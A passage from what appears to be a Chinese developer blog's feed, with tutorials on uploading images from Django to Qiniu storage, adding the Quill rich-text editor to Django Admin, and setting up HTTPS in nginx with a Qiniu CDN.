class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>这个直接复制粘贴就可以了。</p><p>4）给需要上传图片的按钮增加class&#x3D;”upload-btn”</p><p>我们需要用到的是先创建一个隐藏的input，其中name对应着要上传的字段的名字。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">class</span>=<span class="string">&quot;my_upload&quot;</span> <span class="attr">name</span>=<span class="string">&quot;img&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>5）然后给按钮绑定一个点击事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;.upload-btn&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#qnUpload&#x27;</span>).<span class="title function_">click</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中upload-btn 为点击按钮的class名，qnUpload 为隐藏的七牛上传文件的input的Id名。<br>就相当于点击自定义按钮，实际上触发的是七牛的input的上传按钮。</p><p>6）当上传图片时，触发change事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#qnUpload&#x27;</span>).<span class="title function_">change</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">value</span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;http://up-z2.qiniu.com/&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>($(<span class="string">&#x27;#qn&#x27;</span>)[<span class="number">0</span>]),</span><br><span class="line">            <span class="attr">cache</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">contentType</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">processData</span>: <span class="literal">false</span></span><br><span class="line">        &#125;).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> img_src = <span class="string">&#x27;http://opjb0b**.bkt.clouddn.com/&#x27;</span> + data.<span class="property">hash</span>;</span><br><span class="line">           $(<span class="string">&quot;.my_upload&quot;</span>).<span class="title function_">val</span>(img_src); </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里的也直接复制就好。（也可以自行修改class或id属性值）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>data为上传成功时返回的图片数据，data.hash则为图片的名称。</p><p>7）然后我们可以直接获取上传成功的图片路径然后渲染在html页面上。<br>图片的路径为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img_src = <span class="string">&#x27;http://opjb0***.bkt.clouddn.com/&#x27;</span> + data.<span class="property">hash</span>;</span><br></pre></td></tr></table></figure><p>其中<code>http://~~</code>为之前说的测试域名（ps：拼接路径名时别忘记了 ‘&#x2F;‘ ）。</p><h4 id="6-需要上传的字段的信息，已经存储在input的value里了，post的时候就可以获取到图片的路径，然后就可以存储到数据库中了。"><a href="#6-需要上传的字段的信息，已经存储在input的value里了，post的时候就可以获取到图片的路径，然后就可以存储到数据库中了。" class="headerlink" title="6. 需要上传的字段的信息，已经存储在input的value里了，post的时候就可以获取到图片的路径，然后就可以存储到数据库中了。"></a>6. 需要上传的字段的信息，已经存储在input的value里了，post的时候就可以获取到图片的路径，然后就可以存储到数据库中了。</h4>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django Admin 使用富文本插件 Quill 定制后台</title>
      <link href="/2017/08/25/Django-Admin-%E4%BD%BF%E7%94%A8-Quill-%E5%AE%9A%E5%88%B6%E5%90%8E%E5%8F%B0/"/>
      <url>/2017/08/25/Django-Admin-%E4%BD%BF%E7%94%A8-Quill-%E5%AE%9A%E5%88%B6%E5%90%8E%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="为什么选择-Quill"><a href="#为什么选择-Quill" class="headerlink" title="为什么选择 Quill"></a>为什么选择 Quill</h4><p>自从网站的出现，内容创作已经成为了核心。文本域<code>textarea</code>对几乎所有的网站应用提供了一个基础的解决方法。但是在某些情况下你可能需要对文本输入做一些格式设置。这就出现了富文本编辑器。现在拥有很多的解决途径，但是 Quill 会给你一些 Modern Ideas 来考虑去使用它。</p><span id="more"></span><p>图例</p><p><img src="https://cdn.zhengxiangling.com/17-8-25/16063078.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-25/16063078.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h5 id="在admin-py中注册你需要增加富文本插件的表"><a href="#在admin-py中注册你需要增加富文本插件的表" class="headerlink" title="在admin.py中注册你需要增加富文本插件的表"></a>在admin.py中注册你需要增加富文本插件的表</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(<span class="params">models.YourTable</span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">YourTableAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    search_fields = (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>, <span class="string">&#x27;type__name&#x27;</span>)</span><br><span class="line">    list_display = (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;desc&#x27;</span>, <span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">    ordering = (<span class="string">&#x27;-id&#x27;</span>, )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Media</span>:</span><br><span class="line">        js = (</span><br><span class="line">            <span class="string">&#x27;http://cdn.quilljs.com/1.2.4/quill.min.js&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;静态路径/my_admin.js&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line">        css = &#123;</span><br><span class="line">            <span class="string">&#x27;all&#x27;</span>: (</span><br><span class="line">                <span class="string">&#x27;http://cdn.quilljs.com/1.2.4/quill.snow.css&#x27;</span>,</span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.zhengxiangling.com/17-8-25/85990711.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-25/85990711.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>|    要点     | 解释<br>|: ————- :|:————-:|<br>| @admin.register()      | 括号里填你要运用富文本的数据表 |<br>| search_fields| 加入搜索功能，括号里填表中拥有的字段，搜索内容会从填入字段中进行查询      |<br>| list_display | 填入表中拥有的字段，定义在admin中显示的字段信息      |<br>| ordering      | 排序关键字，-id代表按id倒序排列，也就是最新的会排在上面 |<br>| class Media      | 引入外部资源，引入我们需要用到的Quill的css和js文件，其中 静态路径&#x2F;my_admin.js是我们自己新建的js文件，用来自定义Quill所需要的样式 |</p><h5 id="在my-admin-js-中定义Quill样式及富文本要显示的位置"><a href="#在my-admin-js-中定义Quill样式及富文本要显示的位置" class="headerlink" title="在my_admin.js 中定义Quill样式及富文本要显示的位置"></a>在my_admin.js 中定义Quill样式及富文本要显示的位置</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">django.<span class="title function_">jQuery</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> $ = django.<span class="property">jQuery</span></span><br><span class="line"></span><br><span class="line">    $(<span class="string">&#x27;#id_desc&#x27;</span>).<span class="title function_">css</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;opacity&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;height&#x27;</span>: <span class="string">&#x27;1em&#x27;</span>,</span><br><span class="line">    &#125;).<span class="title function_">after</span>(<span class="string">&#x27;&lt;div id=&quot;descEditor&quot; style=&quot;height: 600px&quot;&gt;&lt;/div&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toolbarOptions = [</span><br><span class="line">        [<span class="string">&#x27;bold&#x27;</span>, <span class="string">&#x27;italic&#x27;</span>, <span class="string">&#x27;underline&#x27;</span>, <span class="string">&#x27;strike&#x27;</span>], <span class="comment">// toggled buttons</span></span><br><span class="line">        [<span class="string">&#x27;blockquote&#x27;</span>, <span class="string">&#x27;code-block&#x27;</span>],</span><br><span class="line"></span><br><span class="line">        [&#123; <span class="string">&#x27;list&#x27;</span>: <span class="string">&#x27;ordered&#x27;</span> &#125;, &#123; <span class="string">&#x27;list&#x27;</span>: <span class="string">&#x27;bullet&#x27;</span> &#125;],</span><br><span class="line">        [&#123; <span class="string">&#x27;indent&#x27;</span>: <span class="string">&#x27;-1&#x27;</span> &#125;, &#123; <span class="string">&#x27;indent&#x27;</span>: <span class="string">&#x27;+1&#x27;</span> &#125;], <span class="comment">// outdent/indent</span></span><br><span class="line"></span><br><span class="line">        [&#123; <span class="string">&#x27;header&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="literal">false</span>] &#125;],</span><br><span class="line"></span><br><span class="line">        [&#123; <span class="string">&#x27;color&#x27;</span>: [] &#125;], <span class="comment">// dropdown with defaults from theme</span></span><br><span class="line">        [&#123; <span class="string">&#x27;font&#x27;</span>: [] &#125;],</span><br><span class="line">        [&#123; <span class="string">&#x27;align&#x27;</span>: [] &#125;],</span><br><span class="line">        [<span class="string">&#x27;clean&#x27;</span>], <span class="comment">// remove formatting button</span></span><br><span class="line">        [<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> editor = <span class="keyword">new</span> <span class="title class_">Quill</span>(<span class="string">&#x27;#descEditor&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">modules</span>: &#123;</span><br><span class="line">            <span class="attr">toolbar</span>: &#123;</span><br><span class="line">                <span class="attr">container</span>: toolbarOptions,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">theme</span>: <span class="string">&#x27;snow&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $textarea = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#id_desc&#x27;</span>)</span><br><span class="line">    editor.<span class="title function_">on</span>(<span class="string">&#x27;text-change&#x27;</span>, <span class="keyword">function</span>(<span class="params">delta, oldDelta, source</span>) &#123;</span><br><span class="line">        $textarea.<span class="property">value</span> = editor.<span class="property">root</span>.<span class="property">innerHTML</span></span><br><span class="line">    &#125;)</span><br><span class="line">    editor.<span class="property">root</span>.<span class="property">innerHTML</span> = $textarea.<span class="property">value</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><table><thead><tr><th>要点</th><th align="center">解释</th></tr></thead><tbody><tr><td>var $ &#x3D; django.jQuery</td><td align="center">Django自带jquery，赋值给$比较符合平常使用规范</td></tr><tr><td>$(‘#id_desc’)</td><td align="center">选中需要运用富文本元素的id（id为admin自己生成），所有id需要自行修改</td></tr><tr><td>id&#x3D;”descEditor”</td><td align="center">id&#x3D;”descEditor”为需要插入的富文本插件的id，可自行修改</td></tr><tr><td>editor.on(‘text-change’)</td><td align="center">官方api，当富文本的内容改变时，调用该接口</td></tr></tbody></table><p>editor.on()的作用是，将富文本编辑好的源代码保存在原来的<code>textarea</code>中，这样点击保存修改时才会将富文本的源代码存回到数据库中。</p><h5 id="点击上传图片按钮时，将图片保存到-七牛云"><a href="#点击上传图片按钮时，将图片保存到-七牛云" class="headerlink" title="点击上传图片按钮时，将图片保存到 七牛云"></a>点击上传图片按钮时，将图片保存到 七牛云</h5><p>首先，我们要获取token值</p><blockquote><blockquote><p>token值是什么，可以参考我的文章 – <a href="https://blog.zhengxiangling.com/Django-%E4%B8%8A%E4%BC%A0%E4%B8%83%E7%89%9B%E5%9B%BE%E7%89%87/">DJANGO 运用 七牛云 作为图床上传图片</a><br>定义获取token值的api</p></blockquote></blockquote><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r&#x27;^api/qntoken$&#x27;</span>, views.api_qn_token),</span><br></pre></td></tr></table></figure><p>views.py中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">api_qn_token</span>(<span class="params">request</span>):</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;qntoken&#x27;</span>: qn.upload_token(<span class="string">&#x27;对象存储名&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(json.dumps(data), content_type=<span class="string">&#x27;application/json&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后再my_admin.js中增加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">django.<span class="title function_">jQuery</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> $ = django.<span class="property">jQuery</span></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">var</span> editor = <span class="keyword">new</span> <span class="title class_">Quill</span>(<span class="string">&#x27;#descEditor&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">modules</span>: &#123;</span><br><span class="line">            <span class="attr">toolbar</span>: &#123;</span><br><span class="line">                <span class="attr">container</span>: toolbarOptions,</span><br><span class="line">                <span class="attr">handlers</span>: &#123;</span><br><span class="line">                    <span class="attr">image</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                        $(<span class="string">&#x27;#qnUpload&#x27;</span>).<span class="title function_">click</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">theme</span>: <span class="string">&#x27;snow&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $.<span class="title function_">get</span>(<span class="string">&#x27;/api/qntoken&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).<span class="title function_">append</span>(<span class="string">&#x27;&lt;form id=&quot;qn&quot; method=&quot;post&quot; action=&quot;http://upload.qiniu.com/&quot; enctype=&quot;multipart/form-data&quot;&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;input name=&quot;token&quot; type=&quot;hidden&quot; value=&quot;&#x27;</span>+ data.<span class="property">qntoken</span> +<span class="string">&#x27;&quot;&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;input id=&quot;qnUpload&quot; name=&quot;file&quot; type=&quot;file&quot; style=&quot;display: none&quot;/&gt;&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&lt;/form&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&#x27;#qnUpload&#x27;</span>).<span class="title function_">change</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            $.<span class="title function_">ajax</span>(&#123;                        </span><br><span class="line">                <span class="attr">url</span>: <span class="string">&#x27;http://up-z2.qiniu.com/&#x27;</span>,</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">data</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>($(<span class="string">&#x27;#qn&#x27;</span>)[<span class="number">0</span>]),</span><br><span class="line">                <span class="attr">cache</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">contentType</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">processData</span>: <span class="literal">false</span>,</span><br><span class="line">            &#125;).<span class="title function_">done</span>(<span class="keyword">function</span>(<span class="params"> data </span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> imgSrc = <span class="string">&#x27;http://ov8c***.bkt.clouddn.com/&#x27;</span> + data.<span class="property">hash</span></span><br><span class="line">                <span class="keyword">var</span> range = editor.<span class="title function_">getSelection</span>();</span><br><span class="line">                editor.<span class="title function_">insertEmbed</span>(range.<span class="property">index</span>, <span class="string">&#x27;image&#x27;</span>, imgSrc, <span class="title class_">Quill</span>.<span class="property">sources</span>.<span class="property">USER</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>点击图片按钮，就可以将图片上传到 七牛云 了。</p><p>到此，富文本插件就完成了。</p>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http到https 并用cdn加速资源</title>
      <link href="/2017/08/03/http%E5%88%B0https-%E5%B9%B6%E7%94%A8cdn%E5%8A%A0%E9%80%9F%E8%B5%84%E6%BA%90/"/>
      <url>/2017/08/03/http%E5%88%B0https-%E5%B9%B6%E7%94%A8cdn%E5%8A%A0%E9%80%9F%E8%B5%84%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h4 id="为什么要用https"><a href="#为什么要用https" class="headerlink" title="为什么要用https"></a>为什么要用https</h4><p>https协议的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。</p><span id="more"></span><h4 id="选择ssl证书"><a href="#选择ssl证书" class="headerlink" title="选择ssl证书"></a>选择ssl证书</h4><p>有付费的和免费的。列举两个提供免费的证书，Let’s Encrypt 和 现在限免的TrustAsia（文章写于2017.08.03）。</p><p>1.Let’s Encrypt<br>这个免费、自动化、开放的证书签发服务。Let’s Encrypt 得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛。证书有效期为90天，但可以通过脚本定期更新。</p><p>使用 Let’s Encrypt 的请参考QuQu大佬的 </p><blockquote><p>Let’s Encrypt，免费好用的 HTTPS 证书<br><a href="https://imququ.com/post/letsencrypt-certificate.html">https://imququ.com/post/letsencrypt-certificate.html</a></p></blockquote><blockquote><p>ps: 选择 Let’s Encrypt 的请跳过下面购买证书和使用证书的步骤，因为QuQu大佬已经很详细的说明了 Let’s Encrypt 的使用和配置了。</p></blockquote><p>2.亚洲诚信（TrustAsia®）<br>是亚数信息科技（上海）有限公司应用于信息安全领域的品牌。<br>可以通过七牛云免费申请，证书有效期一年（博主懒人癌犯了，所以选择了这个，- -）</p><p>我的博客 用的TrustAsia，申请流程</p><ol><li><p>注册登录 &gt; 七牛云<br>然后点击 SSL证书服务 &gt; 购买证书</p><blockquote><p>附链接：<a href="https://portal.qiniu.com/certificate/apply">https://portal.qiniu.com/certificate/apply</a></p></blockquote></li><li><p>填写信息<br>信息自己填写，其中需要注意的有域名所有权验证方式：</p></li></ol><p></p><ul><li>域名所有权验证方式有两种：<ul><li>DNS验证 ：DNS验证需要到自己的域名管理里添加TXT验证。</li><li>文件验证：在文件夹中添加文件&#x2F;.well-known&#x2F;pki-validation&#x2F;fileauth.txt，验证文件值由证书提供。</li></ul></li></ul><p></p><p>两种方式二选一。</p><p>填完信息就是到域名所有权验证方式了，完成验证操作之后，需要等待差不多几分钟的时间就可以看到订单状态是已签发了，这时我们就拿到证书了。</p><h4 id="使用ssl证书"><a href="#使用ssl证书" class="headerlink" title="使用ssl证书"></a>使用ssl证书</h4><p>点击 证书管理 &gt; 我的证书，将刚才申请到的证书下载到本地，将文件更名为<code>my_cert</code>(也可以换成自己喜欢的)。</p><p>我的系统用的是 Ubuntu 14.04.1 ，代理用的是nginx，nginx目录文件为 <code>/etc/nginx</code> （这里未提供其他代理的配置）。</p><p>在 <code>/etc/nginx</code> 新建目录 <code>cert</code> 用于存放证书，然后放入刚才下载并更名好的文件夹<code>my_cert</code></p><p>然后配置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name 你的域名;</span><br><span class="line">    listen 443;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate /etc/nginx/cert/my_cert/你下载的文件名.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/cert/my_cert/你下载的文件名.key;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        proxy_pass http://127.0.0.1:port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/blog.access_log;</span><br><span class="line">    error_log /var/log/nginx/blog.error_log;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    client_max_body_size 50m;</span><br><span class="line">    server_name 你的域名;</span><br><span class="line">    rewrite ^(.*) https://$server_name<span class="variable">$1</span> permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>https</code>用的是443端口，<code>ssl_certificate</code>及<code>ssl_certificate_key</code>填的是存放证书的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    client_max_body_size 50m;</span><br><span class="line">    server_name 你的域名;</span><br><span class="line">    rewrite ^(.*) https://$server_name<span class="variable">$1</span> permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>的作用是将http转向https。</p><p>这时访问你的域名就会被添加https了。</p><h4 id="使用cdn加速资源"><a href="#使用cdn加速资源" class="headerlink" title="使用cdn加速资源"></a>使用cdn加速资源</h4><p>让站点飞起来~</p><p>首先使用cdn加速的话，我们可以重新申请一个证书，专门存放需要加速的资源的。</p><p>比如我申请了一个cdn.zhengxiangling.com的ssl证书，因为只是存放加速资源，所以就不用下载证书然后在nginx配置了。</p><p>同样以七牛云举例，点击 资源主页 &gt; 立即添加 融合 CDN 加速 （首先得实名和冲10元才能使用该功能 -）</p><p>为了加速，去吧，10元（皮卡丘）</p><p>然后填写信息，</p><p><img src="https://cdn.zhengxiangling.com/17-8-3/55247823.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-3/55247823.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>有证书了当然选择https通信协议啦</p><p>源站配置就自己新建一个对象存储，（点击 资源主页 &gt; 立即添加 对象存储）<br><img src="https://cdn.zhengxiangling.com/17-8-3/10207993.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-3/10207993.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其他信息按自己喜好而外自己选</p><p>选好之后点击创建，创建过程需要等待一小段时间，具体多长时间说不准。</p><p>创建完成之后需要进入下一步，配置CNAME</p><p><img src="https://cdn.zhengxiangling.com/17-8-3/21173131.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-3/21173131.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>配置完成之后也需要等待一段时间，正确配置之后就会显示发布成功啦~</p><p>然后就可以在之前创建的对象存储中上传需要加速的资源了</p><p><img src="https://cdn.zhengxiangling.com/17-8-3/48429336.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-3/48429336.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后修改默认域名，改成自己的域名<br><img src="https://cdn.zhengxiangling.com/17-8-3/72760733.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-3/72760733.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>点击小眼睛就可以查看加速资源的路径了，就可以拿到需要引用的地方引用加速资源了</p><h4 id="使用极简图床绑定七牛云上传图片"><a href="#使用极简图床绑定七牛云上传图片" class="headerlink" title="使用极简图床绑定七牛云上传图片"></a>使用极简图床绑定七牛云上传图片</h4><p>极简图床支持截图粘贴、拖拽图片上传，其中截图粘贴上传时我最喜欢的一点原因，同时支持Chrome插件。<br><img src="https://cdn.zhengxiangling.com/17-8-4/82594167.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-4/82594167.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.zhengxiangling.com/17-8-4/29476783.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-4/29476783.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>使用方式很简单，点击注册登录，</p><p>点击右上角的设置按钮</p><p>然后配置 空间名称，AK，SK，和域名即可。</p><p><img src="https://cdn.zhengxiangling.com/17-8-4/17778041.jpg" class="lazyload" 